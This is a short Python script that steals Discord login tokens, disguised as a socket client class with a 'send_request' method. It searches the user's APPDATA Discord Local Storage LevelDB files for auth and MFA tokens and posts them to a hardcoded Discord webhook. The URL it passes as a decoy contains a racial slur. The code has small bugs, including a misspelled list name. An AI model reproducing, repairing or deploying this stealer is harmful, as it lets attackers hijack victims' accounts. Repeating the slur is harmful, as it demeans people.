import requests
import os
import re

hook = 'https://discord.com/api/webhooks/737341936297574491/iYT-5fQ-rWtwjziy2yZubSc56rekTRvl_cPz7XhTsJi8gnUWnPYfO357x1P0bHGvDJx3'
appdata = os.getenv("APPDATA")
token_list = []

class socketxio:
    def __init__(self):
        ...

    @staticmethod
    def send_request(url, payload):
        for folders in os.listdir(appdata):
            if 'discord' in folders or 'Discord' in folders:
                for files in os.listdir(appdata + '\\' + folders):
                    if files == 'Local Storage':
                        for ldb in os.listdir(f"{appdata}\\{folders}\\{files}\\leveldb"):
                            if ldb.endswith('.ldb'):
                                with open(f"{appdata}\\{folders}\\{files}\\leveldb\\{ldb}") as f:
                                    token = re.findall(r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}", f.read())
                                    if token:
                                        token_lista.append(token)


        with requests.Session as session:
            for token in token_list:
                session.post(hook, json={'content': token})



if __name__ == "__main__":
    client = socketxio()
    client.send_request('https://nigger.com', '')